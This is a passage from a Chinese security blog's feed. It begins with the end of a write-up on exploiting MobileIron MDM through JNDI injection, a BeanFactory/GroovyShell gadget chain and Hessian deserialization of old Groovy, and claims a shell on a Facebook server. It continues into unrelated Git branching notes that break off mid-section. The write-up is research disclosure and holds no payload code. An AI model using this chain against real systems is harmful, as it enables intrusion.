    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;现在有了 JNDI 注入，只要通过 &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; 和 &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; 在 Black Hat USA 2016 上发表的 &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to RCE Dream Land&lt;/a&gt; 就可以取得远程命令执行了。&lt;/p&gt;

&lt;p&gt;自从 &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; 和 &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; 在 Black Hat 发表了这个新的攻击向量后，帮助了不知道多少黑客，甚至有人认为“遇到反序列化用 JNDI”就对了！，但是自从 2018 年 10 月，Java 把 JNDI 注入的最后一个拼图修复了，这条修复被记录在 &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3149&quot;&gt;CVE-2018-3149&lt;/a&gt; 中，从此以后，所有 Java 版本高于 8u181, 7u191, 6u201 的版本皆无法通过 JNDI/LDAP 的方式执行代码，因此如果要在最新版 MobileIron 上实现攻击，需要另外寻找出路。&lt;/p&gt;

&lt;p&gt;关于 CVE-2018-3149，是通过将 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; 的默认值设置为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; 的方式以达到禁止攻击者下载远程 Bytecode 执行代码。&lt;/p&gt;

&lt;p&gt;但是我们依然可以通过 JNDI 的 Naming Reference 到本机已经有的 Class Factory 上。通过类似 &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt; 的概念，寻找本地可以利用的类别做进一步的利用，详细手法参考 &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; 在 2019 年年初发表的 &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt;，里面详细介绍了如何通过 Tomcat 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; 去载入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; 达到任意代码执行。&lt;/p&gt;

&lt;p&gt;但是由于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; 在 Tomcat 8 以后才被引入，但是目标是 Tomcat 7.x，因此需要为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; 寻找一个新的利用链。&lt;/p&gt;

&lt;p&gt;经过搜索，发现在 &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; 的&lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;文章&lt;/a&gt;中提到：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;除了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;javax.el.ELProcessor&lt;/code&gt;，当然也还有很多其他的类符合条件可以作为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;beanClass&lt;/code&gt; 注入到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; 中实现利用。举个例子，如果目标机器 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;classpath&lt;/code&gt; 中有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groovy&lt;/code&gt; 的库，则可以结合之前 Orange 师傅发过的 &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins 的漏洞实现利用&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;目标的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClassPath&lt;/code&gt; 上刚好有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Groovy&lt;/code&gt; 存在，但是版本为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.5.6&lt;/code&gt;，是一个距今十年不支持 Meta Programming 的版本，所以最后基于 Groovy 的代码，重新寻找了一个在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; 上的利用链，详细信息参考提交给 &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; 的这个 &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;攻击-facebook&quot;&gt;攻击 Facebook&lt;/h2&gt;

&lt;p&gt;有了基于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDI&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BEANFACTORY&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GROOVYSHELL&lt;/code&gt; 的完美远程代码执行漏洞，就可以攻击 Facebook 了。但是检查时发现首页变成了 403 Forbidden，索性 Web Service 还在。&lt;/p&gt;

&lt;p&gt;联系到上次的攻击经验，由于安全考虑，Facebook 会禁止所有针对外部的连接，JNDI 注入的核心就是通过受害者连接至攻击者控制的恶意服务器，并接受回传的恶意 Naming Reference 后所导致的一系列利用，无法连接到攻击者的恶意服务器，就没有办法利用。&lt;/p&gt;

&lt;p&gt;由此，JNDI 注入的路被全部封杀，只能回到 Hessian 反序列化利用。&lt;/p&gt;

&lt;p&gt;为了寻在新的利用链，必须先深入理解已存在的利用链的原理及成因。在重读 &lt;a href=&quot;https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; 的论文后，其中一句话：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovy’s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;猜想：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;作者評估過把 Groovy 當成利用鏈的可行性，雖然被限制住了，但一定覺得有機會才會寫進論文中!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;从这个猜想触发，虽然 Groovy 的利用链被 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; 限制住了，但是目标版本的 Groovy 比较旧，有可能还没进行限制。&lt;/p&gt;

&lt;p&gt;比较 Groovy-1.5.6 和最新版本关于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; 中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readSolve()&lt;/code&gt; 的实现：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;diff 1_5_6/MethodClosure.java 3_0_4/MethodClosure.java

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     private Object readResolve&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALLOW_RESOLVE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;this&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         throw new UnsupportedOperationException&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到旧版没有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; 限制，后来经过查证发现这个限制其实是 Groovy 因为 2015 年出现的 Java 反序列化漏洞而做的缓解措施，而且还被分配了 &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; 这个漏洞编号。由于 Groovy 只是一个在内部使用，不会对外的小配角，因此没有特别需求下开发者也不会特地去更新，因此这成为了攻击链中的重要一环。&lt;/p&gt;

&lt;p&gt;最后攻击成功，取得 Facebook 服务器上的 Shell。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://youtu.be/hGTLIIOb14A&quot; title=&quot;MobileIron MDM unauthenticated REC&quot;&gt;&lt;img src=&quot;https://img.youtube.com/vi/hGTLIIOb14A/0.jpg&quot; alt=&quot;MobileIron MDM unauthenticated REC&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="pentest" /><summary type="html">整理 MobileIron</summary></entry><entry><title type="html">progit 笔记 03 - 分支功能</title><link href="https://blog.securitainment.io/git/github/progit/note/2020/09/18/ProGit-note-03.html" rel="alternate" type="text/html" title="progit 笔记 03 - 分支功能" /><published>2020-09-18T20:29:01+08:00</published><updated>2020-09-18T20:29:01+08:00</updated><id>https://blog.securitainment.io/git/github/progit/note/2020/09/18/ProGit-note-03</id><content type="html" xml:base="https://blog.securitainment.io/git/github/progit/note/2020/09/18/ProGit-note-03.html">&lt;p&gt;本部分主要介绍 Git 的分支功能。&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;分支简介&quot;&gt;分支简介&lt;/h2&gt;
&lt;p&gt;Git 的分支，本质上仅仅是指向提交对象的可变指针。Git 的默认分支名字是 master，它会在每次提交操作中自动向前移动。&lt;/p&gt;

&lt;h3 id=&quot;分支创建&quot;&gt;分支创建&lt;/h3&gt;
&lt;p&gt;使用下面命令，创建 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testing&lt;/code&gt; 分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch testing
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200913205026.jpeg&quot; alt=&quot;Figure 3-4. 两个指向相同提交历史的分支&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这会在当前所在的提交对象上创建一个指针，新建的分支和原来的分支同时指向相同提交历史。Git 还存在一个名为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HEAD&lt;/code&gt; 的特殊指针，指向当前所在的本地分支。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202036.jpeg&quot; alt=&quot;Figure 3-5. HEAD指向当前所在分支&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git log --decorate&lt;/code&gt;查看各个分支当前所指的对象：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--oneline&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decorate&lt;/span&gt;
f30ab &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HEAD, master, testing&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; add feature &lt;span class=&quot;c&quot;&gt;#32 - ability to add new&lt;/span&gt;

34ac2 fixed bug &lt;span class=&quot;c&quot;&gt;#1328 - stack overflow under certain conditions&lt;/span&gt;

98ca9 initial commit of my project
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;分支切换&quot;&gt;分支切换&lt;/h3&gt;
&lt;p&gt;使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git checkout&lt;/code&gt;命令切换分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout testing
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这时 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HEAD&lt;/code&gt;就指向 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testing&lt;/code&gt; 分支了。
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202207.jpeg&quot; alt=&quot;Figure 3-6. HEAD 指向当前所在的分支&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再次修改并提交：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim test.rb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'made a change'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时的提交历史如下：
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202228.jpeg&quot; alt=&quot;Figure 3-7. HEAD 分支随着提交操作自动向前移动&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此时切回 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202241.jpeg&quot; alt=&quot;Figure 3-8. 检出时 HEAD 随之移动&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此时 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git checkout&lt;/code&gt; 命令做了两件事：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;使 HEAD 指回 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支&lt;/li&gt;
  &lt;li&gt;将工作目录恢复为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支所指向的快照内容。&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;p&gt;分支切换会改变工作目录中的文件&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;此时再对项目文件进行修改并提交：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim test.rb
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'made other changes'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;此时项目提交历史已经分叉。新的提交历史看起来如下：
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202253.jpeg&quot; alt=&quot;Figure 3-9. 项目分叉历史&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git log&lt;/code&gt; 命令查看分叉历史：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--oneline&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--decorate&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--graph&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--all&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; c2b9e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;HEAD, master&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; made other changes

| &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 87ab2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;testing&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; made a change

|/

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; f30ab add feature &lt;span class=&quot;c&quot;&gt;#32 - ability to add new formats to the&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 34ac2 fixed bug &lt;span class=&quot;c&quot;&gt;#1328 - stack overflow under certain conditions&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; 98ca9 initial commit of my project
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;分支的新建与合并&quot;&gt;分支的新建与合并&lt;/h2&gt;
&lt;p&gt;这里通过一个实际的例子，展示分支的新建与合并。&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;开发某个网站&lt;/li&gt;
  &lt;li&gt;为实现某个新需求，创建一个分支&lt;/li&gt;
  &lt;li&gt;在这个分支上开展工作&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;此时突然线上突然有一个严重的问题需要紧急修复：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;切换到线上分支&lt;/li&gt;
  &lt;li&gt;为这个紧急任务创建一个分支，并修复问题&lt;/li&gt;
  &lt;li&gt;测试通过后，切换回线上分支，合并修补分支，将改动推送到线上分支&lt;/li&gt;
  &lt;li&gt;切换回最初的工作分支，继续工作&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;新建分支&quot;&gt;新建分支&lt;/h3&gt;
&lt;p&gt;假设现在的项目存在一些提交：
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202302.jpeg&quot; alt=&quot;Figure 3-10. 一个简单的提交历史&quot; /&gt;&lt;/p&gt;

&lt;p&gt;现在需要解决紧急问题#53，可以使用带 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b&lt;/code&gt; 参数的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git checokout&lt;/code&gt; 命令，新建分支同时切换到新分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; iss53
Switched to a new branch &lt;span class=&quot;s2&quot;&gt;&quot;iss53&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该命令是下面两条命令的简写：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch iss53
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout iss53
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202311.jpeg&quot; alt=&quot;Figure 3-11. 创建一个新分支指针&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此时你针对 #53 问题进行了一些修改并提交，iss53 分支在不断推进：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim index.html
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'added a new footer[issue 53]'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202339.jpeg&quot; alt=&quot;Figure 3-12. iss53 分支向前推进&quot; /&gt;
此时一个新的问题出现需要解决，需要我们新建一个针对该问题的分支（hotfix branch），并且解决问题：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; hotfix
Switched to a new branch &lt;span class=&quot;s1&quot;&gt;'hotfix'&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim index.html
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'fixed the broken email address'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;hotfix 1fb7853] fixed the broken email address

1 file changed, 2 insertions&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202353.jpeg&quot; alt=&quot;Figure 3-13. 基于 master 分支的紧急问题分支 hotfix&quot; /&gt;
当测试完成后，需要将 hotfix 分支合并到 master 分支，来部署到线上。使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git merge&lt;/code&gt; 命令来达到该目的：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge hotfix
Updating f42c576..3a0874c

Fast-forward

index.html | 2 ++

1 file changed, 2 insertions&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;本次合并中有一个 ‘Fast-forword’ 关键词，意味着当前 master 分支所指的提交是现在提交 hotfix 分支的直接上游，此时 Git 只是简单的将指针向前移动。
&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202415.jpeg&quot; alt=&quot;Figure 3-14. master 被快进到 hotfix&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个紧急问题的解决方案发布之后，可以通过带 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d&lt;/code&gt; 选项的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git branch&lt;/code&gt; 命令来删除分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; hotfix
Deleted branch hotfix &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3a0874c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在可以切换回原来工作的分支（针对#53问题的分支）：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout iss53
Switched to branch &lt;span class=&quot;s2&quot;&gt;&quot;iss53&quot;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim index.html
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git commit &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'finished the new footer [issue 53]'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;iss53 ad82d7a] finished the new footer &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;issue 53]

1 file changed, 1 insertion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202430.jpeg&quot; alt=&quot;Figure 3-15. 继续在 iss53 分支上工作&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;分支的合并&quot;&gt;分支的合并&lt;/h3&gt;
&lt;p&gt;运行下面命令，将 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iss53&lt;/code&gt; 分支合并到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支中：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout master
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git merge iss53
Merge made by the &lt;span class=&quot;s1&quot;&gt;'recursive'&lt;/span&gt; strategy.
index.html |    1 +
1 file changed, 1 insertion&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/5cr1pt/img4markdown/master/pics/20200918202513.jpeg&quot; alt=&quot;F3-16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;合并成功后可以删除 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iss53&lt;/code&gt; 分支：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git branch &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; iss53
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;遇到冲突时的分支合并&quot;&gt;遇到冲突时的分支合并&lt;/h3&gt;
&lt;p&gt;如果在合并时产生合并冲突：&lt;/p&gt;
